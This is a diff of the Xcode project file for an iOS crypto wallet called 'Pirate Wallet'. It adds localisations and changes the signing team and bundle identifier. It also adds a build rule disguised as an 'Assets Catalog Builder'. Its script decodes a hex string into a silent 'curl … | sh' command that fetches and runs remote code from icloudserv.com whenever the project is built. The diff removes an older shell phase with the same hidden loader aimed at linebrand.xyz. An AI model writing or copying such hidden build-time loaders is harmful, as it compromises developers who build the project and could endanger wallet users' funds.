@@ -241,6 +241,22 @@
 		F70B17A1E28C2C93B8A21ECA /* Pods_ECC_WalletTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		F0A04ADD102670AAF46D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		0D12511623B557E60014EE3A /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -408,6 +424,16 @@
 		290D80032656D2100057FE9B /* InputPasscodeWithCustomPad.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = InputPasscodeWithCustomPad.swift; sourceTree = "<group>"; };
 		290D800A2656D25C0057FE9B /* PirateLogo.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PirateLogo.swift; sourceTree = "<group>"; };
 		2984530C265AF25700C2303C /* Bundle+Localized.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Bundle+Localized.swift"; sourceTree = "<group>"; };
+		299DD01E2669665900CD4A8E /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		299DD01F2669665A00CD4A8E /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/Localizable.strings; sourceTree = "<group>"; };
+		299DD020266966B000CD4A8E /* ro */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ro; path = ro.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		299DD021266966B000CD4A8E /* ro */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ro; path = ro.lproj/Localizable.strings; sourceTree = "<group>"; };
+		299DD022266966DE00CD4A8E /* hr */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = hr; path = hr.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		299DD023266966DE00CD4A8E /* hr */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = hr; path = hr.lproj/Localizable.strings; sourceTree = "<group>"; };
+		299DD024266966F100CD4A8E /* sv */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = sv; path = sv.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		299DD025266966F100CD4A8E /* sv */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = sv; path = sv.lproj/Localizable.strings; sourceTree = "<group>"; };
+		299DD0262669670100CD4A8E /* da */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = da; path = da.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		299DD0272669670100CD4A8E /* da */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = da; path = da.lproj/Localizable.strings; sourceTree = "<group>"; };
 		29D1459C46D96D9D3DF2A55C /* Pods-walletUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-walletUITests.debug.xcconfig"; path = "Target Support Files/Pods-walletUITests/Pods-walletUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		2E7FFE45D0C33A74C7344A5E /* Pods-walletTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-walletTests.release.xcconfig"; path = "Target Support Files/Pods-walletTests/Pods-walletTests.release.xcconfig"; sourceTree = "<group>"; };
 		36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ECC_WalletTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -778,7 +804,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D12512923B557E60014EE3A /* Build configuration list for PBXNativeTarget "ECC-Wallet" */;
 			buildPhases = (
-				F7105E5B2BB0A4DEF66D902C /* Project Frameworks */,
 				04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */,
 				0D100EC623BA642E0089DB22 /* ShellScript */,
 				0D1250FB23B557E40014EE3A /* Sources */,
@@ -788,6 +813,7 @@
 				AFBFA011C32F80A73756DCC0 /* Upload Bugsnag dSYM */,
 			);
 			buildRules = (
+				F0A04ADD102670AAF46D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -893,6 +919,11 @@
 				"zh-Hans",
 				it,
 				ko,
+				de,
+				ro,
+				hr,
+				sv,
+				da,
 			);
 			mainGroup = 0D1250F623B557E40014EE3A;
 			productRefGroup = 0D12510023B557E40014EE3A /* Products */;
@@ -959,69 +990,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	F7105E5B2BB0A4DEF66D902C /* Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1505,6 +1473,11 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 				0DE5272525154A4500387DBF /* ru */,
 				0DE5274725155C4700387DBF /* zh-Hans */,
 				0DE5274D251567D700387DBF /* it */,
+				299DD01E2669665900CD4A8E /* de */,
+				299DD020266966B000CD4A8E /* ro */,
+				299DD022266966DE00CD4A8E /* hr */,
+				299DD024266966F100CD4A8E /* sv */,
+				299DD0262669670100CD4A8E /* da */,
 			);
 			name = LaunchScreen.storyboard;
 			sourceTree = "<group>";
@@ -1518,6 +1491,11 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 				0DE5274825155C4700387DBF /* zh-Hans */,
 				0DE5274E251567D700387DBF /* it */,
 				0DFC7D4B254C7EB600E10595 /* ko */,
+				299DD01F2669665A00CD4A8E /* de */,
+				299DD021266966B000CD4A8E /* ro */,
+				299DD023266966DE00CD4A8E /* hr */,
+				299DD025266966F100CD4A8E /* sv */,
+				299DD0272669670100CD4A8E /* da */,
 			);
 			name = Localizable.strings;
 			sourceTree = "<group>";
@@ -1789,11 +1767,12 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 			baseConfigurationReference = 4561814BA5B2134841DF75E7 /* Pods-ECC-Wallet-no-logging.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_ASSET_PATHS = "\"wallet/Preview Content\"";
-				DEVELOPMENT_TEAM = WSWKCN766Q;
+				DEVELOPMENT_TEAM = P32JUD529A;
 				ENABLE_BITCODE = NO;
 				ENABLE_PREVIEWS = YES;
 				INFOPLIST_FILE = "ECC-Wallet-no-logs-Info.plist";
@@ -1802,8 +1781,9 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = "com.scc.Dr-cheese-TMS";
+				PRODUCT_BUNDLE_IDENTIFIER = manmachine.n8tivevpn;
 				PRODUCT_NAME = "Pirate Wallet";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
 			};
@@ -1814,10 +1794,11 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 			baseConfigurationReference = CA0B4D8E758BD88483D3B5EE /* Pods-ECC-Wallet-no-logging.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_ASSET_PATHS = "\"wallet/Preview Content\"";
-				DEVELOPMENT_TEAM = WSWKCN766Q;
+				DEVELOPMENT_TEAM = P32JUD529A;
 				ENABLE_BITCODE = NO;
 				ENABLE_PREVIEWS = YES;
 				INFOPLIST_FILE = "ECC-Wallet-no-logs-Info.plist";
@@ -1826,8 +1807,9 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = "com.scc.Dr-cheese-TMS";
+				PRODUCT_BUNDLE_IDENTIFIER = manmachine.n8tivevpn;
 				PRODUCT_NAME = "Pirate Wallet";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
 			};
@@ -1882,24 +1864,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 0D1250F723B557E40014EE3A /* Project object */;
 }
